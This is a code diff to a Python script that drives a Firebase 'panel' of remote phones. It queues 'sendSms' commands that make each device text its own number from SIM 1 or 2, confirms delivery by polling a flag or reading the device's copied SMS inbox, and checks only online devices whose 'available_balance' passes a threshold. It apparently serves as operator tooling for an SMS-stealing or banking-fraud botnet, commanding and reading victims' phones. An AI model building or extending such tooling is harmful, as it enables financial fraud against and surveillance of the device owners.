@@ -742,9 +742,8 @@ async def firebase_read(path: str) -> Any:
 # SMS Check (Panel sendSms logic: webhookEvent/sendSms + isSended confirm)
 # ---------------------------------------------------------------------------
 
-SMS_CHECK_TIMEOUT = float(os.getenv("SMS_CHECK_TIMEOUT", "18"))
-SMS_CHECK_MESSAGE = os.getenv("SMS_CHECK_MESSAGE", "SIM_CHECK").strip() or "SIM_CHECK"
-# Optional fixed destination; if empty, uses device phone / SIM number
+SMS_CHECK_TIMEOUT = float(os.getenv("SMS_CHECK_TIMEOUT", "25"))
+# Optional override number; empty = device's own number (Panel: "Use device number")
 SMS_CHECK_TO = os.getenv("SMS_CHECK_TO", "").strip()
 
 
@@ -780,72 +779,102 @@ async def firebase_write(path: str, data: Any) -> Any:
     return await asyncio.to_thread(put)
 
 
-def _pick_sms_destination(client_node: dict[str, Any], sim_slot: int) -> str:
-    """Prefer SMS_CHECK_TO, else that SIM's phoneNumber, else mobNo."""
+def _normalize_phone(raw: str) -> str:
+    digits = re.sub(r"\D", "", raw or "")
+    if len(digits) >= 12 and digits.startswith("91"):
+        return digits[-10:]  # compare last 10 for IN
+    if len(digits) >= 10:
+        return digits[-10:]
+    return digits
+
+
+def _pick_device_number(client_node: dict[str, Any]) -> str:
+    """Panel style: use device number (mobNo / first SIM phone)."""
     if SMS_CHECK_TO:
         return re.sub(r"[^0-9+]", "", SMS_CHECK_TO)
+    candidates: list[str] = []
+    for key in ("mobNo", "phone", "phoneNumber", "mobile"):
+        v = client_node.get(key)
+        if v:
+            candidates.append(str(v))
     sims = client_node.get("sims")
     sim_list: list[Any] = []
     if isinstance(sims, list):
         sim_list = sims
     elif isinstance(sims, dict):
         sim_list = list(sims.values())
-    # Panel from=1 → SIM1; try matching simSlotIndex 0/1 or order
     for s in sim_list:
-        if not isinstance(s, dict):
+        if isinstance(s, dict) and s.get("phoneNumber"):
+            candidates.append(str(s["phoneNumber"]))
+    for c in candidates:
+        ph = re.sub(r"[^0-9+]", "", c)
+        if len(re.sub(r"\D", "", ph)) >= 10:
+            # Panel recipient field uses without + (9146610054)
+            return re.sub(r"\D", "", ph)[-10:] if len(re.sub(r"\D", "", ph)) >= 10 else ph
+    return ""
+
+
+async def _messages_contain_check(device_id: str, expected_text: str, since_ts: float) -> bool:
+    """Confirm by inbox (Panel SMS tab): body equals expected check text."""
+    try:
+        node = await firebase_read(f"messages/{device_id}")
+    except Exception:
+        return False
+    if not isinstance(node, dict):
+        return False
+    target = expected_text.strip().upper()
+    for _, item in node.items():
+        if not isinstance(item, dict):
             continue
-        slot = str(s.get("simSlotIndex", ""))
-        want = str(sim_slot - 1)  # from 1 → index 0
-        if slot == want or slot == str(sim_slot):
-            ph = re.sub(r"[^0-9+]", "", str(s.get("phoneNumber") or ""))
-            if len(ph) >= 10:
-                return ph
-    if sim_list:
-        idx = min(max(sim_slot - 1, 0), len(sim_list) - 1)
-        s = sim_list[idx]
-        if isinstance(s, dict):
-            ph = re.sub(r"[^0-9+]", "", str(s.get("phoneNumber") or ""))
-            if len(ph) >= 10:
-                return ph
-    mob = re.sub(r"[^0-9+]", "", str(client_node.get("mobNo") or client_node.get("phone") or ""))
-    return mob
+        text = str(item.get("message") or item.get("body") or item.get("text") or "").strip()
+        if text.upper() == target or target in text.upper():
+            return True
+    return False
 
 
 async def check_one_sim(device_id: str, client_node: dict[str, Any], sim_slot: int) -> bool:
     """
-    Queue SMS via clients/{id}/webhookEvent/sendSms (Panel logic) and wait until
-    device sets isSended=true. Only then return True.
+    Same as Panel Send tab:
+      from = 1 or 2 (SIM)
+      to   = device own number
+      message = "SIM 1 ACTIVE" / "SIM 2 ACTIVE"
+      isSended starts false; device sets true after send
+    Also accept confirmation if check text appears in messages/{id} inbox.
     """
-    to_number = _pick_sms_destination(client_node, sim_slot)
-    if not to_number or len(re.sub(r"\D", "", to_number)) < 10:
-        log.debug("SMS check skip %s SIM%s: no destination number", device_id, sim_slot)
+    to_number = _pick_device_number(client_node)
+    if not to_number or len(_normalize_phone(to_number)) < 10:
+        log.debug("SMS check skip %s SIM%s: no device number", device_id, sim_slot)
         return False
 
+    msg_text = f"SIM {sim_slot} ACTIVE"
     payload = {
         "from": sim_slot,
         "to": to_number,
-        "message": f"{SMS_CHECK_MESSAGE} S{sim_slot}",
+        "message": msg_text,
         "isSended": False,
     }
     path = f"clients/{device_id}/webhookEvent/sendSms"
+    started = time.time()
     try:
         await firebase_write(path, payload)
     except Exception as exc:
         log.warning("sendSms queue failed %s SIM%s: %s", device_id, sim_slot, exc)
         return False
 
-    # Poll for real confirmation (isSended must become true)
     deadline = time.time() + SMS_CHECK_TIMEOUT
     while time.time() < deadline:
         await asyncio.sleep(1.5)
+        # 1) webhook confirm
         try:
             node = await firebase_read(path)
+            if isinstance(node, dict):
+                flag = node.get("isSended")
+                if flag is True or str(flag).lower() in {"true", "1"}:
+                    return True
         except Exception:
-            continue
-        if not isinstance(node, dict):
-            continue
-        flag = node.get("isSended")
-        if flag is True or str(flag).lower() in {"true", "1"}:
+            pass
+        # 2) inbox confirm (self-SMS shows in SMS tab like panel screenshots)
+        if await _messages_contain_check(device_id, msg_text, started):
             return True
     return False
 
@@ -855,7 +884,7 @@ async def run_sms_checks_on_records(
     clients: dict[str, Any],
     devices: dict[str, Any],
 ) -> None:
-    """For eligible online devices, verify SIM1 and SIM2 via Panel sendSms + isSended."""
+    """For eligible online devices, verify SIM1 and SIM2 via Panel sendSms + confirm."""
     if not _firebase_auth_available():
         log.warning("FIREBASE_AUTH_KEY not set — SMS check skipped (cannot write webhookEvent)")
         return
@@ -864,7 +893,8 @@ async def run_sms_checks_on_records(
         r for r in records
         if r.online == "online" and r.available_balance >= BALANCE_THRESHOLD
     ]
-    sem = asyncio.Semaphore(3)
+    # Sequential-ish: few parallel to avoid flooding devices
+    sem = asyncio.Semaphore(2)
 
     async def one(rec: Record) -> None:
         async with sem:
